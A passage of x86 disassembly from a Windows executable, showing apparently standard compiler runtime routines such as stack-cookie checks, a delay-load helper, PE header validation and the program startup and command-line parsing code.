  40873b:	inc    eax
  40873c:	mov    ecx,0x40cdc4
  408741:	xchg   DWORD PTR [ecx],eax
  408743:	cmp    eax,0x1
  408746:	jne    0x40875f
  408748:	mov    esi,ecx
  40874a:	push   0xa
  40874c:	call   DWORD PTR ds:0x40e0c4
  408752:	xor    eax,eax
  408754:	inc    eax
  408755:	xchg   DWORD PTR [esi],eax
  408757:	cmp    eax,0x1
  40875a:	je     0x40874a
  40875c:	mov    esi,DWORD PTR [ebp-0x4]
  40875f:	cmp    BYTE PTR ds:0x40b0a1,0x0
  408766:	mov    eax,ds:0x40cdc8
  40876b:	je     0x40878d
  40876d:	test   eax,eax
  40876f:	jne    0x40878d
  408771:	mov    ecx,0x4014e0
  408776:	call   0x408af6
  40877b:	test   eax,eax
  40877d:	mov    ds:0x40cdc8,eax
  408782:	sete   cl
  408785:	dec    cl
  408787:	and    BYTE PTR ds:0x40b0a1,cl
  40878d:	xor    ecx,ecx
  40878f:	test   eax,eax
  408791:	je     0x4087a3
  408793:	push   edi
  408794:	push   eax
  408795:	call   DWORD PTR ds:0x40e0fc
  40879b:	mov    ecx,eax
  40879d:	test   ecx,ecx
  40879f:	je     0x4087a3
  4087a1:	mov    DWORD PTR [esi],ecx
  4087a3:	and    DWORD PTR ds:0x40cdc4,0x0
  4087aa:	mov    eax,ecx
  4087ac:	pop    edi
  4087ad:	pop    esi
  4087ae:	mov    esp,ebp
  4087b0:	pop    ebp
  4087b1:	ret    
  4087b2:	int3   
  4087b3:	int3   
  4087b4:	int3   
  4087b5:	int3   
  4087b6:	int3   
  4087b7:	int3   
  4087b8:	int3   
  4087b9:	int3   
  4087ba:	int3   
  4087bb:	int3   
  4087bc:	int3   
  4087bd:	int3   
  4087be:	int3   
  4087bf:	int3   
  4087c0:	mov    edi,edi
  4087c2:	push   ebp
  4087c3:	mov    ebp,esp
  4087c5:	push   ecx
  4087c6:	mov    eax,ds:0x40b000
  4087cb:	xor    eax,ebp
  4087cd:	mov    DWORD PTR [ebp-0x4],eax
  4087d0:	mov    edx,0x40b05c
  4087d5:	mov    ecx,0x4021cc
  4087da:	call   0x40872a
  4087df:	test   eax,eax
  4087e1:	je     0x408800
  4087e3:	push   esi
  4087e4:	push   DWORD PTR [ebp+0x10]
  4087e7:	mov    esi,DWORD PTR ds:0x40b05c
  4087ed:	mov    ecx,esi
  4087ef:	push   DWORD PTR [ebp+0xc]
  4087f2:	push   DWORD PTR [ebp+0x8]
  4087f5:	call   DWORD PTR ds:0x40e20c
  4087fb:	call   esi
  4087fd:	pop    esi
  4087fe:	jmp    0x408802
  408800:	xor    eax,eax
  408802:	mov    ecx,DWORD PTR [ebp-0x4]
  408805:	xor    ecx,ebp
  408807:	call   0x409090
  40880c:	mov    esp,ebp
  40880e:	pop    ebp
  40880f:	ret    0xc
  408812:	int3   
  408813:	int3   
  408814:	int3   
  408815:	int3   
  408816:	int3   
  408817:	int3   
  408818:	int3   
  408819:	int3   
  40881a:	int3   
  40881b:	int3   
  40881c:	int3   
  40881d:	int3   
  40881e:	int3   
  40881f:	int3   
  408820:	mov    edi,edi
  408822:	push   ebp
  408823:	mov    ebp,esp
  408825:	push   ecx
  408826:	mov    eax,ds:0x40b000
  40882b:	xor    eax,ebp
  40882d:	mov    DWORD PTR [ebp-0x4],eax
  408830:	mov    edx,0x40b058
  408835:	mov    ecx,0x4021e4
  40883a:	call   0x40872a
  40883f:	test   eax,eax
  408841:	je     0x408869
  408843:	push   esi
  408844:	push   DWORD PTR [ebp+0x1c]
  408847:	mov    esi,DWORD PTR ds:0x40b058
  40884d:	mov    ecx,esi
  40884f:	push   DWORD PTR [ebp+0x18]
  408852:	push   DWORD PTR [ebp+0x14]
  408855:	push   DWORD PTR [ebp+0x10]
  408858:	push   DWORD PTR [ebp+0xc]
  40885b:	push   DWORD PTR [ebp+0x8]
  40885e:	call   DWORD PTR ds:0x40e20c
  408864:	call   esi
  408866:	pop    esi
  408867:	jmp    0x40886b
  408869:	xor    eax,eax
  40886b:	mov    ecx,DWORD PTR [ebp-0x4]
  40886e:	xor    ecx,ebp
  408870:	call   0x409090
  408875:	mov    esp,ebp
  408877:	pop    ebp
  408878:	ret    0x18
  40887b:	int3   
  40887c:	int3   
  40887d:	int3   
  40887e:	int3   
  40887f:	int3   
  408880:	mov    edi,edi
  408882:	push   ebp
  408883:	mov    ebp,esp
  408885:	push   ecx
  408886:	mov    eax,ds:0x40b000
  40888b:	xor    eax,ebp
  40888d:	mov    DWORD PTR [ebp-0x4],eax
  408890:	mov    edx,0x40b054
  408895:	mov    ecx,0x4021f8
  40889a:	call   0x40872a
  40889f:	test   eax,eax
  4088a1:	je     0x4088ba
  4088a3:	push   esi
  4088a4:	push   DWORD PTR [ebp+0x8]
  4088a7:	mov    esi,DWORD PTR ds:0x40b054
  4088ad:	mov    ecx,esi
  4088af:	call   DWORD PTR ds:0x40e20c
  4088b5:	call   esi
  4088b7:	pop    esi
  4088b8:	jmp    0x4088bc
  4088ba:	xor    eax,eax
  4088bc:	mov    ecx,DWORD PTR [ebp-0x4]
  4088bf:	xor    ecx,ebp
  4088c1:	call   0x409090
  4088c6:	mov    esp,ebp
  4088c8:	pop    ebp
  4088c9:	ret    0x4
  4088cc:	int3   
  4088cd:	int3   
  4088ce:	int3   
  4088cf:	int3   
  4088d0:	int3   
  4088d1:	int3   
  4088d2:	int3   
  4088d3:	int3   
  4088d4:	int3   
  4088d5:	int3   
  4088d6:	int3   
  4088d7:	int3   
  4088d8:	int3   
  4088d9:	int3   
  4088da:	int3   
  4088db:	int3   
  4088dc:	int3   
  4088dd:	int3   
  4088de:	int3   
  4088df:	int3   
  4088e0:	mov    edi,edi
  4088e2:	push   ebp
  4088e3:	mov    ebp,esp
  4088e5:	push   ecx
  4088e6:	mov    eax,ds:0x40b000
  4088eb:	xor    eax,ebp
  4088ed:	mov    DWORD PTR [ebp-0x4],eax
  4088f0:	push   esi
  4088f1:	mov    esi,DWORD PTR ds:0x40b074
  4088f7:	mov    ecx,esi
  4088f9:	call   DWORD PTR ds:0x40e20c
  4088ff:	call   esi
  408901:	mov    ecx,DWORD PTR [ebp-0x4]
  408904:	xor    eax,eax
  408906:	xor    ecx,ebp
  408908:	inc    eax
  408909:	pop    esi
  40890a:	call   0x409090
  40890f:	mov    esp,ebp
  408911:	pop    ebp
  408912:	ret    0x4
  408915:	int3   
  408916:	int3   
  408917:	int3   
  408918:	int3   
  408919:	int3   
  40891a:	push   0xc
  40891c:	push   0x409ef0
  408921:	call   0x409bc8
  408926:	mov    esi,0x40b080
  40892b:	mov    edi,0x40cdcc
  408930:	jmp    0x40893a
  408932:	push   0xa
  408934:	call   DWORD PTR ds:0x40e0c4
  40893a:	xor    eax,eax
  40893c:	inc    eax
  40893d:	xchg   DWORD PTR [edi],eax
  40893f:	cmp    eax,0x1
  408942:	je     0x408932
  408944:	mov    eax,ds:0x40cdd0
  408949:	test   eax,eax
  40894b:	je     0x40898c
  40894d:	mov    ecx,DWORD PTR ds:0x40b080
  408953:	test   ecx,ecx
  408955:	je     0x40896a
  408957:	mov    eax,DWORD PTR [esi+0x4]
  40895a:	mov    DWORD PTR [ecx],eax
  40895c:	lea    esi,[esi+0x8]
  40895f:	mov    ecx,DWORD PTR [esi]
  408961:	test   ecx,ecx
  408963:	jne    0x408957
  408965:	mov    eax,ds:0x40cdd0
  40896a:	and    DWORD PTR [ebp-0x4],0x0
  40896e:	push   eax
  40896f:	call   DWORD PTR ds:0x40e084
  408975:	jmp    0x40897e
  408977:	xor    eax,eax
  408979:	inc    eax
  40897a:	ret    
  40897b:	mov    esp,DWORD PTR [ebp-0x18]
  40897e:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  408985:	and    DWORD PTR ds:0x40cdd0,0x0
  40898c:	mov    BYTE PTR ds:0x40b0a2,0x1
  408993:	and    DWORD PTR ds:0x40cdcc,0x0
  40899a:	call   0x409c0d
  40899f:	ret    
  4089a0:	int3   
  4089a1:	int3   
  4089a2:	int3   
  4089a3:	int3   
  4089a4:	int3   
  4089a5:	mov    edi,edi
  4089a7:	push   ecx
  4089a8:	push   ecx
  4089a9:	call   0x40891a
  4089ae:	pop    ecx
  4089af:	pop    ecx
  4089b0:	ret    
  4089b1:	int3   
  4089b2:	int3   
  4089b3:	int3   
  4089b4:	int3   
  4089b5:	int3   
  4089b6:	mov    edi,edi
  4089b8:	push   ebp
  4089b9:	mov    ebp,esp
  4089bb:	push   ecx
  4089bc:	push   ecx
  4089bd:	mov    eax,ds:0x40b000
  4089c2:	xor    eax,ebp
  4089c4:	mov    DWORD PTR [ebp-0x4],eax
  4089c7:	push   esi
  4089c8:	mov    eax,ecx
  4089ca:	xor    esi,esi
  4089cc:	cmp    BYTE PTR ds:0x40cc14,0x0
  4089d3:	mov    DWORD PTR [ebp-0x8],eax
  4089d6:	jne    0x4089e6
  4089d8:	push   0x105
  4089dd:	push   eax
  4089de:	call   DWORD PTR ds:0x40e12c
  4089e4:	jmp    0x408a51
  4089e6:	push   ebx
  4089e7:	push   0x402228
  4089ec:	call   DWORD PTR ds:0x40e0bc
  4089f2:	mov    ebx,eax
  4089f4:	test   ebx,ebx
  4089f6:	je     0x408a50
  4089f8:	push   edi
  4089f9:	push   0x40220c
  4089fe:	push   ebx
  4089ff:	call   DWORD PTR ds:0x40e0fc
  408a05:	mov    edi,eax
  408a07:	test   edi,edi
  408a09:	jne    0x408a13
  408a0b:	call   DWORD PTR ds:0x40e0f4
  408a11:	jmp    0x408a3d
  408a13:	push   0x105
  408a18:	push   DWORD PTR [ebp-0x8]
  408a1b:	mov    ecx,edi
  408a1d:	call   DWORD PTR ds:0x40e20c
  408a23:	call   edi
  408a25:	mov    edi,eax
  408a27:	test   edi,edi
  408a29:	je     0x408a37
  408a2b:	cmp    edi,0x105
  408a31:	ja     0x408a3f
  408a33:	xor    esi,esi
  408a35:	jmp    0x408a3f
  408a37:	call   DWORD PTR ds:0x40e0f4
  408a3d:	mov    esi,eax
  408a3f:	push   ebx
  408a40:	call   DWORD PTR ds:0x40e084
  408a46:	push   esi
  408a47:	call   DWORD PTR ds:0x40e0f8
  408a4d:	mov    eax,edi
  408a4f:	pop    edi
  408a50:	pop    ebx
  408a51:	mov    ecx,DWORD PTR [ebp-0x4]
  408a54:	xor    ecx,ebp
  408a56:	pop    esi
  408a57:	call   0x409090
  408a5c:	mov    esp,ebp
  408a5e:	pop    ebp
  408a5f:	ret    
  408a60:	int3   
  408a61:	int3   
  408a62:	int3   
  408a63:	int3   
  408a64:	int3   
  408a65:	mov    edi,edi
  408a67:	push   ebx
  408a68:	push   esi
  408a69:	push   edi
  408a6a:	mov    esi,ecx
  408a6c:	mov    edi,edx
  408a6e:	push   0x5c
  408a70:	pop    ebx
  408a71:	test   esi,esi
  408a73:	je     0x408aa5
  408a75:	cmp    WORD PTR [esi],0x0
  408a79:	je     0x408aa5
  408a7b:	push   esi
  408a7c:	call   DWORD PTR ds:0x40e0ec
  408a82:	cmp    eax,0x2
  408a85:	jl     0x408aa5
  408a87:	movzx  eax,WORD PTR [esi]
  408a8a:	cmp    eax,0x7f
  408a8d:	jae    0x408a96
  408a8f:	cmp    WORD PTR [esi+0x2],0x3a
  408a94:	je     0x408aa1
  408a96:	cmp    ax,bx
  408a99:	jne    0x408aa5
  408a9b:	cmp    WORD PTR [esi+0x2],bx
  408a9f:	jne    0x408aa5
  408aa1:	xor    al,al
  408aa3:	jmp    0x408aed
  408aa5:	push   ecx
  408aa6:	mov    ecx,edi
  408aa8:	call   0x4089b6
  408aad:	pop    ecx
  408aae:	mov    ecx,eax
  408ab0:	test   ecx,ecx
  408ab2:	je     0x408aa1
  408ab4:	lea    eax,[ecx+0x2]
  408ab7:	mov    edx,0x105
  408abc:	cmp    eax,edx
  408abe:	ja     0x408aa1
  408ac0:	mov    WORD PTR [edi+ecx*2],bx
  408ac4:	xor    eax,eax
  408ac6:	mov    WORD PTR [edi+ecx*2+0x2],ax
  408acb:	mov    ecx,edi
  408acd:	push   esi
  408ace:	call   0x40275f
  408ad3:	test   eax,eax
  408ad5:	js     0x408aa1
  408ad7:	push   0x402244
  408adc:	mov    edx,0x105
  408ae1:	mov    ecx,edi
  408ae3:	call   0x40275f
  408ae8:	test   eax,eax
  408aea:	setns  al
  408aed:	pop    edi
  408aee:	pop    esi
  408aef:	pop    ebx
  408af0:	ret    
  408af1:	int3   
  408af2:	int3   
  408af3:	int3   
  408af4:	int3   
  408af5:	int3   
  408af6:	mov    edi,edi
  408af8:	push   ebp
  408af9:	mov    ebp,esp
  408afb:	sub    esp,0x210
  408b01:	mov    eax,ds:0x40b000
  408b06:	xor    eax,ebp
  408b08:	mov    DWORD PTR [ebp-0x4],eax
  408b0b:	push   esi
  408b0c:	xor    eax,eax
  408b0e:	mov    esi,ecx
  408b10:	push   0x208
  408b15:	push   eax
  408b16:	mov    WORD PTR [ebp-0x210],ax
  408b1d:	lea    eax,[ebp-0x20e]
  408b23:	push   eax
  408b24:	call   0x409b76
  408b29:	pop    ecx
  408b2a:	pop    ecx
  408b2b:	lea    edx,[ebp-0x210]
  408b31:	mov    ecx,esi
  408b33:	call   0x408a65
  408b38:	pop    ecx
  408b39:	pop    esi
  408b3a:	test   al,al
  408b3c:	je     0x408b4d
  408b3e:	lea    eax,[ebp-0x210]
  408b44:	push   eax
  408b45:	call   DWORD PTR ds:0x40e0bc
  408b4b:	jmp    0x408b4f
  408b4d:	xor    eax,eax
  408b4f:	mov    ecx,DWORD PTR [ebp-0x4]
  408b52:	xor    ecx,ebp
  408b54:	call   0x409090
  408b59:	mov    esp,ebp
  408b5b:	pop    ebp
  408b5c:	ret    
  408b5d:	int3   
  408b5e:	int3   
  408b5f:	int3   
  408b60:	int3   
  408b61:	int3   
  408b62:	mov    eax,ds:0x40cffc
  408b67:	push   ebx
  408b68:	xor    ebx,ebx
  408b6a:	inc    ebx
  408b6b:	cmp    eax,ebx
  408b6d:	jne    0x408b73
  408b6f:	xor    al,al
  408b71:	pop    ebx
  408b72:	ret    
  408b73:	test   eax,eax
  408b75:	je     0x408b7b
  408b77:	mov    al,bl
  408b79:	pop    ebx
  408b7a:	ret    
  408b7b:	push   esi
  408b7c:	push   0x402250
  408b81:	call   0x408d12
  408b86:	mov    esi,eax
  408b88:	test   esi,esi
  408b8a:	jne    0x408b9c
  408b8c:	push   0x40229c
  408b91:	call   0x408d12
  408b96:	mov    esi,eax
  408b98:	test   esi,esi
  408b9a:	je     0x408bc4
  408b9c:	push   0x4022b8
  408ba1:	push   esi
  408ba2:	call   0x408d1e
  408ba7:	mov    ds:0x40d000,eax
  408bac:	test   eax,eax
  408bae:	je     0x408bc4
  408bb0:	push   0x4022d0
  408bb5:	push   esi
  408bb6:	call   0x408d1e
  408bbb:	mov    ds:0x40cff8,eax
  408bc0:	test   eax,eax
  408bc2:	jne    0x408bc6
  408bc4:	mov    esi,ebx
  408bc6:	xor    eax,eax
  408bc8:	mov    DWORD PTR ds:0x40cffc,esi
  408bce:	cmp    esi,ebx
  408bd0:	pop    esi
  408bd1:	setne  al
  408bd4:	pop    ebx
  408bd5:	ret    
  408bd6:	int3   
  408bd7:	int3   
  408bd8:	int3   
  408bd9:	int3   
  408bda:	int3   
  408bdb:	mov    edi,edi
  408bdd:	push   ebp
  408bde:	mov    ebp,esp
  408be0:	sub    esp,0x34
  408be3:	mov    eax,ds:0x40b000
  408be8:	xor    eax,ebp
  408bea:	mov    DWORD PTR [ebp-0x4],eax
  408bed:	mov    ecx,DWORD PTR [ebp+0x8]
  408bf0:	mov    edx,0x400000
  408bf5:	push   ebx
  408bf6:	push   esi
  408bf7:	push   edi
  408bf8:	mov    eax,DWORD PTR [ecx+0x8]
  408bfb:	mov    edi,DWORD PTR [ecx+0x4]
  408bfe:	add    eax,edx
  408c00:	mov    ebx,DWORD PTR [ecx+0x10]
  408c03:	add    edi,edx
  408c05:	mov    DWORD PTR [ebp-0x10],eax
  408c08:	add    ebx,edx
  408c0a:	mov    eax,DWORD PTR [ecx+0xc]
  408c0d:	add    eax,edx
  408c0f:	mov    DWORD PTR [ebp-0xc],edi
  408c12:	mov    DWORD PTR [ebp-0x8],eax
  408c15:	mov    eax,DWORD PTR [ebp-0x10]
  408c18:	mov    esi,DWORD PTR [eax]
  408c1a:	call   0x408b62
  408c1f:	test   al,al
  408c21:	je     0x408c51
  408c23:	mov    esi,DWORD PTR ds:0x40d000
  408c29:	mov    ecx,esi
  408c2b:	push   0x0
  408c2d:	push   DWORD PTR [ebp+0xc]
  408c30:	push   DWORD PTR ds:0x40e140
  408c36:	push   DWORD PTR ds:0x4022ec
  408c3c:	push   DWORD PTR [ebp+0x8]
  408c3f:	push   0x400000
  408c44:	call   DWORD PTR ds:0x40e20c
  408c4a:	call   esi
  408c4c:	jmp    0x408ced
  408c51:	mov    eax,DWORD PTR [ebp+0xc]
  408c54:	sub    eax,DWORD PTR [ebp-0x8]
  408c57:	sar    eax,0x2
  408c5a:	mov    ecx,DWORD PTR [ebx+eax*4]
  408c5d:	lea    ebx,[ecx+0x400002]
  408c63:	test   ecx,ecx
  408c65:	jns    0x408c6a
  408c67:	movzx  ebx,cx
  408c6a:	test   esi,esi
  408c6c:	jne    0x408cd3
  408c6e:	push   esi
  408c6f:	push   esi
  408c70:	push   edi
  408c71:	call   DWORD PTR ds:0x40e130
  408c77:	mov    esi,eax
  408c79:	test   esi,esi
  408c7b:	je     0x408ce5
  408c7d:	mov    ecx,DWORD PTR [ebp-0x10]
  408c80:	mov    edx,esi
  408c82:	xor    eax,eax
  408c84:	lock cmpxchg DWORD PTR [ecx],edx
  408c88:	mov    DWORD PTR [ebp-0x8],eax
  408c8b:	test   eax,eax
  408c8d:	jne    0x408cc6
  408c8f:	push   0x8
  408c91:	pop    ecx
  408c92:	lea    edi,[ebp-0x30]
  408c95:	rep stos DWORD PTR es:[edi],eax
  408c97:	mov    eax,ds:0x4022ec
  408c9c:	mov    edi,DWORD PTR [ebp-0xc]
  408c9f:	mov    DWORD PTR [ebp-0x34],0x24
  408ca6:	mov    DWORD PTR [ebp-0x28],edi
  408ca9:	mov    DWORD PTR [ebp-0x1c],esi
  408cac:	mov    DWORD PTR [ebp-0xc],eax
  408caf:	test   eax,eax
  408cb1:	je     0x408ccf
  408cb3:	lea    ecx,[ebp-0x34]
  408cb6:	push   ecx
  408cb7:	push   0x5
  408cb9:	mov    ecx,eax
  408cbb:	call   DWORD PTR ds:0x40e20c
  408cc1:	call   DWORD PTR [ebp-0xc]
  408cc4:	jmp    0x408ccf
  408cc6:	push   esi
  408cc7:	call   0x408d06
  408ccc:	mov    esi,DWORD PTR [ebp-0x8]
  408ccf:	test   esi,esi
  408cd1:	je     0x408ce5
  408cd3:	push   ebx
  408cd4:	push   esi
  408cd5:	call   0x408d1e
  408cda:	test   eax,eax
  408cdc:	je     0x408ce5
  408cde:	mov    ecx,DWORD PTR [ebp+0xc]
  408ce1:	mov    DWORD PTR [ecx],eax
  408ce3:	jmp    0x408ced
  408ce5:	push   ebx
  408ce6:	push   edi
  408ce7:	call   DWORD PTR ds:0x40e140
  408ced:	mov    ecx,DWORD PTR [ebp-0x4]
  408cf0:	pop    edi
  408cf1:	pop    esi
  408cf2:	xor    ecx,ebp
  408cf4:	pop    ebx
  408cf5:	call   0x409090
  408cfa:	mov    esp,ebp
  408cfc:	pop    ebp
  408cfd:	ret    0x8
  408d00:	int3   
  408d01:	int3   
  408d02:	int3   
  408d03:	int3   
  408d04:	int3   
  408d05:	int3   
  408d06:	jmp    DWORD PTR ds:0x40e084
  408d0c:	int3   
  408d0d:	int3   
  408d0e:	int3   
  408d0f:	int3   
  408d10:	int3   
  408d11:	int3   
  408d12:	jmp    DWORD PTR ds:0x40e0a0
  408d18:	int3   
  408d19:	int3   
  408d1a:	int3   
  408d1b:	int3   
  408d1c:	int3   
  408d1d:	int3   
  408d1e:	jmp    DWORD PTR ds:0x40e0fc
  408d24:	int3   
  408d25:	int3   
  408d26:	int3   
  408d27:	int3   
  408d28:	int3   
  408d29:	int3   
  408d2a:	int3   
  408d2b:	int3   
  408d2c:	int3   
  408d2d:	int3   
  408d2e:	int3   
  408d2f:	int3   
  408d30:	mov    eax,0x5a4d
  408d35:	cmp    WORD PTR ds:0x400000,ax
  408d3c:	je     0x408d42
  408d3e:	xor    eax,eax
  408d40:	jmp    0x408d90
  408d42:	mov    ecx,DWORD PTR ds:0x40003c
  408d48:	cmp    DWORD PTR [ecx+0x400000],0x4550
  408d52:	jne    0x408d3e
  408d54:	movzx  eax,WORD PTR [ecx+0x400018]
  408d5b:	cmp    eax,0x10b
  408d60:	je     0x408d7c
  408d62:	cmp    eax,0x20b
  408d67:	jne    0x408d3e
  408d69:	xor    eax,eax
  408d6b:	cmp    DWORD PTR [ecx+0x400084],0xe
  408d72:	jbe    0x408d90
  408d74:	cmp    DWORD PTR [ecx+0x4000f8],eax
  408d7a:	jmp    0x408d8d
  408d7c:	xor    eax,eax
  408d7e:	cmp    DWORD PTR [ecx+0x400074],0xe
  408d85:	jbe    0x408d90
  408d87:	cmp    DWORD PTR [ecx+0x4000e8],eax
  408d8d:	setne  al
  408d90:	push   0x2
  408d92:	mov    ds:0x40c0e8,eax
  408d97:	call   0x40979e
  408d9c:	push   eax
  408d9d:	call   DWORD PTR ds:0x40e194
  408da3:	or     DWORD PTR ds:0x40cfec,0xffffffff
  408daa:	or     DWORD PTR ds:0x40cff0,0xffffffff
  408db1:	pop    ecx
  408db2:	pop    ecx
  408db3:	call   DWORD PTR ds:0x40e1a4
  408db9:	mov    ecx,DWORD PTR ds:0x40c418
  408dbf:	mov    DWORD PTR [eax],ecx
  408dc1:	call   DWORD PTR ds:0x40e188
  408dc7:	mov    ecx,DWORD PTR ds:0x40c40c
  408dcd:	mov    DWORD PTR [eax],ecx
  408dcf:	call   0x4099f0
  408dd4:	cmp    DWORD PTR ds:0x40b010,0x0
  408ddb:	jne    0x408de9
  408ddd:	push   0x4099f0
  408de2:	call   DWORD PTR ds:0x40e1ac
  408de8:	pop    ecx
  408de9:	call   0x4099f8
  408dee:	xor    eax,eax
  408df0:	ret    
  408df1:	int3   
  408df2:	int3   
  408df3:	int3   
  408df4:	int3   
  408df5:	int3   
  408df6:	int3   
  408df7:	int3   
  408df8:	int3   
  408df9:	int3   
  408dfa:	int3   
  408dfb:	int3   
  408dfc:	int3   
  408dfd:	int3   
  408dfe:	int3   
  408dff:	int3   
  408e00:	mov    eax,ds:0x40c414
  408e05:	push   0x40c0ec
  408e0a:	push   DWORD PTR ds:0x40c410
  408e10:	mov    ds:0x40c0ec,eax
  408e15:	push   0x40c0e0
  408e1a:	push   0x40c0dc
  408e1f:	push   0x40c0d8
  408e24:	call   DWORD PTR ds:0x40e190
  408e2a:	add    esp,0x14
  408e2d:	mov    ds:0x40c0e4,eax
  408e32:	ret    
  408e33:	int3   
  408e34:	int3   
  408e35:	int3   
  408e36:	int3   
  408e37:	int3   
  408e38:	int3   
  408e39:	int3   
  408e3a:	int3   
  408e3b:	int3   
  408e3c:	int3   
  408e3d:	int3   
  408e3e:	int3   
  408e3f:	int3   
  408e40:	call   0x409948
  408e45:	jmp    0x408e4f
  408e4a:	int3   
  408e4b:	int3   
  408e4c:	int3   
  408e4d:	int3   
  408e4e:	int3   
  408e4f:	push   0x5c
  408e51:	push   0x409f10
  408e56:	call   0x409a1c
  408e5b:	and    DWORD PTR [ebp-0x24],0x0
  408e5f:	and    DWORD PTR [ebp-0x4],0x0
  408e63:	lea    eax,[ebp-0x6c]
  408e66:	push   eax
  408e67:	call   DWORD PTR ds:0x40e158
  408e6d:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  408e74:	xor    ebx,ebx
  408e76:	inc    ebx
  408e77:	mov    DWORD PTR [ebp-0x4],ebx
  408e7a:	mov    eax,fs:0x18
  408e80:	mov    edi,DWORD PTR [eax+0x4]
  408e83:	xor    esi,esi
  408e85:	mov    edx,0x40cfe0
  408e8a:	mov    ecx,edi
  408e8c:	xor    eax,eax
  408e8e:	lock cmpxchg DWORD PTR [edx],ecx
  408e92:	test   eax,eax
  408e94:	je     0x408e9c
  408e96:	cmp    eax,edi
  408e98:	jne    0x408eae
  408e9a:	mov    esi,ebx
  408e9c:	cmp    DWORD PTR ds:0x40cfe4,ebx
  408ea2:	jne    0x408ebb
  408ea4:	push   0x1f
  408ea6:	call   0x4097da
  408eab:	pop    ecx
  408eac:	jmp    0x408eea
  408eae:	push   0x3e8
  408eb3:	call   DWORD PTR ds:0x40e0c4
  408eb9:	jmp    0x408e85
  408ebb:	cmp    DWORD PTR ds:0x40cfe4,0x0
  408ec2:	jne    0x408ee4
  408ec4:	mov    DWORD PTR ds:0x40cfe4,ebx
  408eca:	push   0x401028
  408ecf:	push   0x40101c
  408ed4:	call   0x40903a
  408ed9:	pop    ecx
  408eda:	pop    ecx
  408edb:	test   eax,eax
  408edd:	je     0x408eea
  408edf:	jmp    0x409023
  408ee4:	mov    DWORD PTR ds:0x40c0d4,ebx
  408eea:	cmp    DWORD PTR ds:0x40cfe4,ebx
  408ef0:	jne    0x408f0d
  408ef2:	push   0x401018
  408ef7:	push   0x401000
  408efc:	call   0x409a10
  408f01:	pop    ecx
  408f02:	pop    ecx
  408f03:	mov    DWORD PTR ds:0x40cfe4,0x2
  408f0d:	test   esi,esi
  408f0f:	jne    0x408f1a
  408f11:	xor    eax,eax
  408f13:	mov    ecx,0x40cfe0
  408f18:	xchg   DWORD PTR [ecx],eax
  408f1a:	cmp    DWORD PTR ds:0x40cff4,0x0
  408f21:	je     0x408f48
  408f23:	push   0x40cff4
  408f28:	call   0x409840
  408f2d:	pop    ecx
  408f2e:	test   eax,eax
  408f30:	je     0x408f48
  408f32:	push   0x0
  408f34:	push   0x2
  408f36:	push   0x0
  408f38:	mov    esi,DWORD PTR ds:0x40cff4
  408f3e:	mov    ecx,esi
  408f40:	call   DWORD PTR ds:0x40e20c
  408f46:	call   esi
  408f48:	mov    eax,ds:0x40e1b4
  408f4d:	mov    esi,DWORD PTR [eax]
  408f4f:	mov    DWORD PTR [ebp-0x20],esi
  408f52:	mov    edi,DWORD PTR [ebp-0x24]
  408f55:	mov    cl,BYTE PTR [esi]
  408f57:	cmp    cl,0x20
  408f5a:	ja     0x408fa6
  408f5c:	test   cl,cl
  408f5e:	je     0x408f64
  408f60:	test   edi,edi
  408f62:	jne    0x408fa6
  408f64:	mov    al,BYTE PTR [esi]
  408f66:	test   al,al
  408f68:	je     0x408f74
  408f6a:	cmp    al,0x20
  408f6c:	ja     0x408f74
  408f6e:	inc    esi
  408f6f:	mov    DWORD PTR [ebp-0x20],esi
  408f72:	jmp    0x408f64
  408f74:	test   BYTE PTR [ebp-0x40],0x1
  408f78:	je     0x408f80
  408f7a:	movzx  eax,WORD PTR [ebp-0x3c]
  408f7e:	jmp    0x408f83
  408f80:	push   0xa
  408f82:	pop    eax
  408f83:	push   eax
  408f84:	push   esi
  408f85:	push   0x0
  408f87:	push   0x400000
  408f8c:	call   0x407668
  408f91:	mov    ds:0x40c0d0,eax
  408f96:	cmp    DWORD PTR ds:0x40c0e8,0x0
  408f9d:	jne    0x408fff
  408f9f:	push   eax
  408fa0:	call   DWORD PTR ds:0x40e198
  408fa6:	cmp    cl,0x22
  408fa9:	jne    0x408fb7
  408fab:	xor    eax,eax
  408fad:	test   edi,edi
  408faf:	sete   al
  408fb2:	mov    edi,eax
  408fb4:	mov    DWORD PTR [ebp-0x24],edi
  408fb7:	movzx  eax,cl
  408fba:	push   eax
  408fbb:	call   DWORD PTR ds:0x40e1a8
  408fc1:	pop    ecx
  408fc2:	test   eax,eax
  408fc4:	je     0x408fca
  408fc6:	inc    esi
  408fc7:	mov    DWORD PTR [ebp-0x20],esi
  408fca:	inc    esi
  408fcb:	mov    DWORD PTR [ebp-0x20],esi
  408fce:	jmp    0x408f55
  408fd0:	mov    ecx,DWORD PTR [ebp-0x14]
  408fd3:	mov    eax,DWORD PTR [ecx]
  408fd5:	mov    eax,DWORD PTR [eax]
  408fd7:	mov    DWORD PTR [ebp-0x28],eax
  408fda:	push   ecx
  408fdb:	push   eax
  408fdc:	call   0x409724
  408fe1:	pop    ecx
  408fe2:	pop    ecx
  408fe3:	ret    
  408fe4:	mov    esp,DWORD PTR [ebp-0x18]
  408fe7:	mov    eax,DWORD PTR [ebp-0x28]
  408fea:	mov    ds:0x40c0d0,eax
  408fef:	cmp    DWORD PTR ds:0x40c0e8,0x0
  408ff6:	jne    0x408fff
  408ff8:	push   eax
  408ff9:	call   DWORD PTR ds:0x40e19c
  408fff:	cmp    DWORD PTR ds:0x40c0d4,0x0
  409006:	jne    0x409013
  409008:	call   DWORD PTR ds:0x40e1a0
  40900e:	mov    eax,ds:0x40c0d0
  409013:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  40901a:	jmp    0x40902f
  40901c:	xor    eax,eax
  40901e:	inc    eax
  40901f:	ret    
  409020:	mov    esp,DWORD PTR [ebp-0x18]
  409023:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  40902a:	mov    eax,0xff
  40902f:	call   0x409a64
  409034:	ret    
  409035:	int3   
  409036:	int3   
  409037:	int3   
  409038:	int3   
  409039:	int3   
  40903a:	mov    edi,edi
  40903c:	push   ebp
  40903d:	mov    ebp,esp
  40903f:	push   ecx
  409040:	mov    eax,ds:0x40b000
  409045:	xor    eax,ebp
  409047:	mov    DWORD PTR [ebp-0x4],eax
  40904a:	push   esi
  40904b:	mov    esi,DWORD PTR [ebp+0x8]
  40904e:	xor    eax,eax
  409050:	cmp    esi,DWORD PTR [ebp+0xc]
  409053:	jae    0x409073
  409055:	push   edi
  409056:	test   eax,eax
  409058:	jne    0x409072
